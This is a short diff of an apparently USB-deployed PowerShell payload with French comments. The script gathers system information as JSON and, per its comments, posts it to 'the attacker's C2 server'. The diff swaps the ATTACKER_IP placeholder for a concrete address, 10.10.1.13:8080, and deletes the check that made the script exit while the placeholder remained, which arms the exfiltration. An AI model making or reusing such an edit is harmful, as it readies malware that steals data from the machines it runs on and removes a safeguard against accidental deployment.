@@ -217,12 +217,7 @@ $sysInfo = @{
 $jsonData = $sysInfo | ConvertTo-Json -Compress
 
 # ── Adresse du serveur C2 de l'attaquant ──────────────────────
-# IMPORTANT : remplacer ATTACKER_IP par l'IP réelle du serveur C2
-# avant de déployer sur la clé USB.
-$c2Base = "http://ATTACKER_IP:8080"
-
-# Vérification que le placeholder a bien été remplacé avant déploiement
-if ($c2Base -match "ATTACKER_IP") { exit }
+$c2Base = "http://10.10.1.13:8080"
 
 # ── Tentative 1 : HTTP POST vers le serveur C2 ───────────────
 $sent = $false
